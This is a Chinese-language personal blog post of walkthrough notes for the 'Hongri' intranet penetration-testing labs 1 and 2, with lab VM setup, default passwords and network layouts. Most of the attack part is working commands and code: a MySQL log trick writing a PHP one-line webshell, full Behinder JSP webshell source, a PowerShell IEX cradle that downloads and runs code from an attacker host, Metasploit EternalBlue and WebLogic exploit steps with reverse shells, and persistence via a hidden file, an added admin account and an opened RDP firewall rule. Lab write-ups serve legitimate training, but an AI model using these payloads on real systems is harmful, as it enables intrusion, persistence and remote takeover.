<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红日靶场12457 | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="+红日靶场1配置说明：虚拟机所有初始密码都为hongrisec@2019（后面需要改密码，自己设置） 12我修改为lidd@800  win7 要把打印机协议打开 1234本地--域192.168.52.143本地5192.168.57.3  win2008 12本地192.168.52.138  win2k3 1192.168.236.141  在win7的phpstudy打开服务，打不开就重启">
<meta property="og:type" content="article">
<meta property="og:title" content="红日靶场12457">
<meta property="og:url" content="http://example.com/2024/12/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/index.html">
<meta property="og:site_name" content="DDL&#39;S BLOG">
<meta property="og:description" content="+红日靶场1配置说明：虚拟机所有初始密码都为hongrisec@2019（后面需要改密码，自己设置） 12我修改为lidd@800  win7 要把打印机协议打开 1234本地--域192.168.52.143本地5192.168.57.3  win2008 12本地192.168.52.138  win2k3 1192.168.236.141  在win7的phpstudy打开服务，打不开就重启">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/img/avatar.png">
<meta property="article:published_time" content="2024-12-26T13:22:52.000Z">
<meta property="article:modified_time" content="2024-12-31T07:56:01.892Z">
<meta property="article:author" content="DDL">
<meta property="article:tag" content="6intranet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2024/12/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '红日靶场12457',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">红日靶场12457</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场12457</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-26T13:22:52.000Z" title="Created 2024-12-26 21:22:52">2024-12-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-31T07:56:01.892Z" title="Updated 2024-12-31 15:56:01">2024-12-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">8.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>39mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="红日靶场1"><a href="#红日靶场1" class="headerlink" title="+红日靶场1"></a>+红日靶场1</h1><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><strong>说明：虚拟机所有初始密码都为hongrisec@2019（后面需要改密码，自己设置）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我修改为</span><br><span class="line">lidd@800</span><br></pre></td></tr></table></figure>

<p>win7</p>
<p>要把打印机协议打开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">本地--域</span><br><span class="line">192.168.52.143</span><br><span class="line">本地5</span><br><span class="line">192.168.57.3</span><br></pre></td></tr></table></figure>

<p>win2008</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本地</span><br><span class="line">192.168.52.138</span><br></pre></td></tr></table></figure>

<p>win2k3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.236.141</span><br></pre></td></tr></table></figure>

<p>在win7的phpstudy打开服务，打不开就重启一次</p>
<p>本地可以访问，其他用户无法访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/liuhhaiffeng/article/details/72137102</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241226102432069.png?raw=true" alt="image-20241226102432069"></p>
<h2 id="开打"><a href="#开打" class="headerlink" title="开打"></a>开打</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.57.3</span><br></pre></td></tr></table></figure>

<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><h4 id="一rogue-mysql"><a href="#一rogue-mysql" class="headerlink" title="一rogue_mysql"></a>一rogue_mysql</h4><p>任意文件读取，但是得盲猜，还要当前用户有权限</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241226104319320.png?raw=true" alt="image-20241226104319320"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241226112030019.png?raw=true" alt="image-20241226112030019"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241226112110334.png?raw=true" alt="image-20241226112110334"></p>
<h4 id="二-数据库弱口令"><a href="#二-数据库弱口令" class="headerlink" title="二 数据库弱口令"></a>二 数据库弱口令</h4><h5 id="日志写码"><a href="#日志写码" class="headerlink" title="日志写码"></a>日志写码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看日志状态： show variables like &#x27;%general%&#x27;; </span><br><span class="line">开启general_log为True： SET GLOBAL general_log=&#x27;on&#x27;; </span><br><span class="line">执行命令指定日志写马： SET GLOBAL general_log_file=&#x27;C:/phpStudy/www/1.php&#x27;; </span><br><span class="line">写入一句话到马中： SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="三yxcms"><a href="#三yxcms" class="headerlink" title="三yxcms"></a>三yxcms</h4><p>备份文件泄露，可以找到，</p>
<p>首页有后台的登陆账号和密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:123456</span><br></pre></td></tr></table></figure>

<p>登陆后台写码（后台的前端管理界面，修改后的在备份文件里找目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.3/yxcms/protected/apps/default/view/default/info.php</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241226123059830.png?raw=true" alt="image-20241226123059830"></p>
<h5 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.51cto.com/u_16747374/12210159</span><br></pre></td></tr></table></figure>

<h4 id="四永恒之蓝直接打"><a href="#四永恒之蓝直接打" class="headerlink" title="四永恒之蓝直接打"></a>四永恒之蓝直接打</h4><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><p>生成exe的码。蚁剑放进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir</span><br><span class="line">cs.exe</span><br><span class="line">attrib cs.exe +s +h</span><br></pre></td></tr></table></figure>

<p><code>attrib cs.exe +s +h</code> 的意思是将 <code>cs.exe</code> 文件的属性设置为：</p>
<ul>
<li><strong>系统文件</strong>（<code>+s</code>）</li>
<li><strong>隐藏文件</strong>（<code>+h</code>）</li>
</ul>
<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><h5 id="联动msf"><a href="#联动msf" class="headerlink" title="联动msf"></a>联动msf</h5><p><img src="https://github.com/DDL08/images/blob/img/img/image-20241226125044878.png?raw=true" alt="image-20241226125044878"></p>
<p>spawn产卵，选监听</p>
<p>打永恒之蓝</p>
<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><h5 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h5><p>cs横移，jump–》psexec，因为win7机子32的</p>
<h3 id="开远程桌面"><a href="#开远程桌面" class="headerlink" title="开远程桌面"></a>开远程桌面</h3><h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><ul>
<li>端口转发–即可将内网域控主机的<code>192.168.52.138</code>的 3389 端口代理到 Win7 跳板机的 9999 端口上，大佬演示如下：</li>
</ul>
<p>portfwd add -l 9999 -r 192.168.52.138 -p 3389</p>
<p>- </p>
<p>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</p>
<h4 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#win7开启3389</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"># 添加账户密码</span><br><span class="line">net user Tr0e Pass!@123 /add</span><br><span class="line"># 给Tr0e账户添加为管理员权限</span><br><span class="line">net localgroup administrators Tr0e /add</span><br><span class="line">#查询是否成功添加 Tr0e 用户</span><br><span class="line">net user Tr0e</span><br><span class="line">#添加防火墙规则</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Open 3389&quot; dir=in action=allow protocol=TCP localport=3389</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241226202254909.png?raw=true" alt="image-20241226202254909"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/braty_/article/details/133283870</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/pa0fu/p/18287429</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/341470.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_39190897/article/details/118353886</span><br></pre></td></tr></table></figure>

<h1 id="红日靶场2"><a href="#红日靶场2" class="headerlink" title="+红日靶场2"></a>+红日靶场2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Intranet  //内网</span><br><span class="line">internals  //内部</span><br></pre></td></tr></table></figure>

<p>DC： server2012</p>
<p>pc：</p>
<p>web:win7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户登录账号密码为：de1ay、1qaz@WSX</span><br><span class="line"></span><br><span class="line">管理员账号密码为：administrator、1qaz@WSX</span><br></pre></td></tr></table></figure>

<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>红日2web机子用的是weblogic服务</p>
<h2 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h2><h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><p>（Dynamic Host Configuration Protocol，动态主机配置协议）</p>
<p>是一种用于自动分配 IP 地址和其他网络配置参数的网络协议。</p>
<h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p><img src="https://github.com/DDL08/images/blob/img/img/image-20241225094911793.png?raw=true" alt="image-20241225094911793"></p>
<ul>
<li>v8–192.168.57.0 <ul>
<li>在这里我用于外网IP</li>
</ul>
</li>
<li>v5–10.10.10.0<ul>
<li>域内IP（内网IP</li>
</ul>
</li>
</ul>
<p>最开始是下边这样，根据自己虚拟网卡改，或者改虚拟网卡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">web两张网卡：</span><br><span class="line">外网ip - 192.168.111.80</span><br><span class="line">内网ip - 10.10.10.80</span><br><span class="line">PC两张网卡：</span><br><span class="line">外网ip - 192.168.10.201</span><br><span class="line">内网ip - 10.10.10.201</span><br><span class="line">DC： server2012</span><br><span class="line">内网ip - 10.10.10.10</span><br></pre></td></tr></table></figure>

<p>改成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">web两张网卡：</span><br><span class="line">外网ip - 192.168.57.80</span><br><span class="line">内网ip - 10.10.10.80</span><br><span class="line">PC两张网卡：</span><br><span class="line">外网ip - 192.168.57.201</span><br><span class="line">内网ip - 10.10.10.201</span><br><span class="line">DC：</span><br><span class="line">内网ip - 10.10.10.10</span><br></pre></td></tr></table></figure>

<p>成功标志能通IP<img src="https://github.com/DDL08/images/blob/img/img/image-20241225094835066.png?raw=true" alt="image-20241225094835066"></p>
<h3 id="域控机无法ping-web机和pc机"><a href="#域控机无法ping-web机和pc机" class="headerlink" title="域控机无法ping web机和pc机"></a>域控机无法ping web机和pc机</h3><p>web机和pc机子的防火墙smb（打印机入站打开</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241224215151849.png?raw=true" alt="image-20241224215151849"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241224215127797.png?raw=true" alt="image-20241224215127797"></p>
<h2 id="开打-1"><a href="#开打-1" class="headerlink" title="开打"></a>开打</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C://Oraclelliddlewareluser projectsldomainslbase domainlbin </span><br><span class="line">这里有startweblogic启动脚本，可以开启web服务</span><br></pre></td></tr></table></figure>

<h3 id="disearch"><a href="#disearch" class="headerlink" title="disearch"></a>disearch</h3><p>直接访问80端口是黑的，没开放</p>
<p>192.168.10.80:7001&#x2F;console这是首页</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241225101420011.png?raw=true" alt="image-20241225101420011"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241225100102330.png?raw=true" alt="image-20241225100102330"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">445端口开放意味着存在smb服务，可能存在ms17_010永恒之蓝漏洞。</span><br><span class="line">139端口开放即存在Samba服务，就可能存在爆破/未授权访问/远程命令执行漏洞。</span><br><span class="line">1433端口开放就存在mssql服务，可能存在爆破/注入/SA弱口令。</span><br><span class="line">3389端口开放存在远程桌面。</span><br><span class="line">7001端口开放就存在weblogic。</span><br><span class="line">7001端口是可行的即weblogic的漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 WeblogicScan.py -u 192.168.57.80 -p 7001</span><br></pre></td></tr></table></figure>

<p>扫出来利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shack2/javaserializetools</span><br></pre></td></tr></table></figure>

<h3 id="cs-1"><a href="#cs-1" class="headerlink" title="cs"></a>cs</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.57.131/1&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.57.131/1&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole										    #进入框架</span><br><span class="line">search  ms17_010                                    # 使用search命令查找相关漏洞</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块</span><br><span class="line">info     										    #使用info查看模块信息</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp    	#设置攻击载荷</span><br><span class="line">show options    									#查看模块需要配置的参数</span><br><span class="line">set  RHOST  192.168.100.158    					    #设置参数</span><br><span class="line">exploit / run     								    #攻击</span><br><span class="line">后渗透阶段											#后渗透阶段</span><br></pre></td></tr></table></figure>

<p>在msf6中切换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sessions  //出列表</span><br><span class="line">sessions -i id   //切换</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在meterpreter</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background   //回到msf6</span><br></pre></td></tr></table></figure>

<h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><h4 id="法一-2"><a href="#法一-2" class="headerlink" title="法一"></a>法一</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">show options</span><br><span class="line">set payload java/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.57.131</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h4 id="法二-2"><a href="#法二-2" class="headerlink" title="法二"></a>法二</h4><p>msf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.57.80</span><br><span class="line"></span><br><span class="line">set lhost 192.168.57.131</span><br><span class="line"></span><br><span class="line">set target 1</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><p><img src="https://github.com/DDL08/images/blob/img/img/image-20241225102953599.png?raw=true" alt="image-20241225102953599"></p>
<p>师傅的冰蝎码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;</span><br><span class="line">&lt;%!class U extends ClassLoader&#123;</span><br><span class="line">    U(ClassLoader c)&#123;</span><br><span class="line">        super(c);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public Class g(byte []b)&#123;</span><br><span class="line">        return super.defineClass(b,0,b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;%&gt;</span><br><span class="line">&lt;%if (request.getMethod().equals(&quot;POST&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br><span class="line">    session.putValue(&quot;u&quot;,k);</span><br><span class="line">    Cipher c=Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">    c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));</span><br><span class="line">    new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class="line">&#125;%&gt;</span><br></pre></td></tr></table></figure>

<p>然后利用弹shell机制处理完给cs,但我没弹出来</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241225160900173.png?raw=true" alt="image-20241225160900173"></p>
<h4 id="法四"><a href="#法四" class="headerlink" title="法四"></a>法四</h4><p>永恒之蓝，但被360拦截了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.tencent.com/developer/article/2187130</span><br></pre></td></tr></table></figure>

<h3 id="弹给cs"><a href="#弹给cs" class="headerlink" title="弹给cs"></a>弹给cs</h3><h4 id="法一-3"><a href="#法一-3" class="headerlink" title="法一"></a>法一</h4><p>用的是上述弹shell方法2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 192.168.235.129</span><br><span class="line">set lport 8888</span><br><span class="line">set session 2</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

